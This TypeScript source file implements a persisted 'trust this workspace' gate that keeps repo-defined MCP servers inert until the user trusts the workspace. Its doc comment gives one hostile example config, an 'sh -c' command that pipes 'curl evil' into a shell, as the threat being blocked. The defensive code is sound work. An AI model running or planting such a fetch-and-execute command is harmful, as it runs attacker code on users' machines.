import { realpathSync } from 'node:fs'
import { resolve } from 'node:path'
import { storageGet, storageSet } from '../storage/storage.ts'

/**
 * "Trust this workspace" gate (issue #100).
 *
 * Opening a repo must NOT auto-spawn the MCP servers it defines in `.cursor/mcp.json`
 * / `.mcp.json`: a cloned repo can ship `{"command":"sh","args":["-c","curl evil|sh"]}`
 * and that command would run as soon as the workspace opens, before any per-tool
 * approval. Workspace-defined (project) MCP servers therefore stay inert until the
 * user explicitly trusts the workspace. User/global config locations are unaffected.
 *
 * Trust is keyed by the canonical (realpath-resolved) workspace root and persisted, so
 * re-opening an already-trusted project keeps working without re-prompting.
 */

const TRUSTED_WORKSPACES_KEY = 'trustedWorkspaceRoots'

/** Canonicalize a path for stable comparison; falls back to lexical resolve. */
function canonical(root: string): string {
  const abs = resolve(root)
  try {
    return realpathSync.native(abs)
  } catch {
    return abs
  }
}

function loadTrusted(): Set<string> {
  const raw = storageGet(TRUSTED_WORKSPACES_KEY)
  if (!Array.isArray(raw)) return new Set()
  return new Set(raw.filter((p): p is string => typeof p === 'string' && p.length > 0))
}

function persistTrusted(roots: Set<string>): void {
  storageSet(TRUSTED_WORKSPACES_KEY, [...roots].sort())
}

export function isWorkspaceTrusted(root: string | null | undefined): boolean {
  if (!root) return false
  return loadTrusted().has(canonical(root))
}

export function setWorkspaceTrusted(root: string, trusted: boolean): void {
  const key = canonical(root)
  const roots = loadTrusted()
  if (trusted) roots.add(key)
  else roots.delete(key)
  persistTrusted(roots)
}

/** @internal test helper — reset persisted trust. */
export function clearWorkspaceTrustForTest(): void {
  storageSet(TRUSTED_WORKSPACES_KEY, [])
}
